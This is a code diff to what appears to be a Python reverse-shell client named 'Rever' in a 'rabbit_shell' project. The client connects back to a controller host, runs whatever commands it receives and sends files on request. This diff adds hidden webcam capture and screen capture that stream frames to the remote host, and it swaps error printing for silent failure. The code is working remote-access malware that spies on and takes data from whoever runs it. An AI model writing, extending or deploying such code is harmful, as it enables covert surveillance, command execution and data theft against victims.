@@ -21,14 +21,10 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 """
-
-
-
-
-
+import pickle
 import socket
 import os
-import threading
+import cv2
 import sys
 import time
 sys.path.insert(0, '..')
@@ -36,6 +32,11 @@ from rabbit_shell.data import data as dt
 from rabbit_shell.data import basic
 from rabbit_shell.controller import client_side
 from rabbit_shell.background import backstuff
+import threading
+from rabbit_shell.stream.webcam import stream_webcam
+from rabbit_shell.stream.screen import stream_screen
+stream_webcam = stream_webcam()
+stream_screen = stream_screen()
 client_side = client_side.client_side()
 class Rever:
 
@@ -50,6 +51,9 @@ class Rever:
         """
         self.server = client_side.formate_socket()
         self.filetrans_server = client_side.formate_socket()
+        self.stream_server = client_side.formate_socket()
+        self.stream_cam = False
+        self.stream_screen = False
         """
         :var self.server - request creation of main server
         :var self.filetrans_server - request creation of file transfer server
@@ -57,6 +61,7 @@ class Rever:
         """
         self.port = port
         self.host = host
+        self.stream = False
         """
         :var self.port - define port
         :var self.host - define host
@@ -96,6 +101,71 @@ class Rever:
                 """
                 continue
 
+    def webcam_stream_runtime(self):
+        if self.stream and self.stream_cam:
+            stream_camera = cv2.VideoCapture(0)
+        else:
+            stream_camera = False
+
+        while True:
+
+                if self.stream and self.stream_cam:
+                    ret, frame = stream_camera.read()
+
+                    frame = stream_webcam.colorframe(frame)
+
+                    dt = {
+                        "key": basic.KEY,
+                        "frame": frame
+                    }
+
+
+                    packed = pickle.dumps(dt)
+                    try:
+                        self.stream_server.send(packed)
+                    except Exception as e:
+                        pass
+
+                elif self.stream_screen and self.stream:
+
+
+
+                    size = stream_screen.screen_size()
+
+                    frame = stream_screen.screen_frame(size)
+
+                    frame = stream_screen.resize_frame(frame)
+
+
+                    '''                    frame = ImageGrab.grab(siz)
+                                        frame = np.array(frame)
+                    
+                                        h, w, L = frame.shape
+                                        h = int(h / 2)
+                                        w = int(w / 2)
+                                        frame = cv2.resize(frame, (w, h))'''
+
+                    dt = {
+                        "key": basic.KEY,
+                        "frame": frame
+                    }
+                    print(frame)
+                    print(dt)
+                    packed = pickle.dumps(dt)
+                    try:
+                        self.stream_server.send(packed)
+                        print("sent pack")
+                    except Exception as e:
+                        print(e)
+
+                    '''                elif not self.stream_cam:
+                                        stream_camera = cv2.VideoCapture(0)'''
+                elif self.stream_cam:
+                    stream_camera.release()
+                else:
+                   break
+
+
 
     def filetrans_send(self, filename):
         """
@@ -128,8 +198,13 @@ class Rever:
         host arg and port from main fun
 
         """
-        to = (host, port)
         return client_side.connect(self.filetrans_server, host, port)
+
+
+    def connect_tostream(self, host, port):
+        client_side.connect(self.stream_server, host, port)
+        return self.stream_server.send(client_side.logdata())
+
 
 
     def recv(self):
@@ -176,6 +251,7 @@ class Rever:
         """
         self.connect(self.host, self.port)
         self.server.send(client_side.logdata())
+        self.connect_tostream(self.host, self.port - dt.CAM_FRAME_PORT)
         self.connect_tofiletrans(self.host, self.port - dt.FILETRANS_PORT)
         """
         starts filetrans receiving thread
@@ -190,6 +266,14 @@ class Rever:
             
             """
             data = self.recv()
+
+            if str(data) in ["stream:screen", "stream:cam"] and self.stream:
+
+                self.stream_cam = False
+                self.stream_screen = False
+                self.stream = False
+
+
             # checks if first 2 chars are cd if they are It'll cd to the rest
             if data[:2] == "cd":
                 try:
@@ -201,6 +285,29 @@ class Rever:
             elif data[:8] == "reqfile:":
                 self.filetrans_send(data[8:])
 
+            elif data == "stream:cam":
+
+                self.stream = True
+                self.stream_cam = True
+                self.stream_screen = False
+                threading.Thread(target=self.webcam_stream_runtime).start()
+
+                self.send("OK")
+
+            elif data == "stream:screen":
+
+                self.stream = True
+                self.stream_screen = True
+                self.stream_cam = False
+                threading.Thread(target=self.webcam_stream_runtime).start()
+
+                self.send("OK")
+            elif data == "stream:stop":
+                self.stream_cam = False
+                self.stream_screen = False
+                self.stream = False
+                self.send("OK")
+
             else:
 
                 response = self.runcommand(data)
@@ -208,10 +315,9 @@ class Rever:
                 self.send(response.decode("utf-8"))
 
 if __name__ == "__main__":
-    time.sleep(10)
+    time.sleep(15)
     c = Rever(str(basic.HOST), int(basic.PORT))
 
     try: c.main()
     except Exception as e:
-        print(e)
-
+        pass
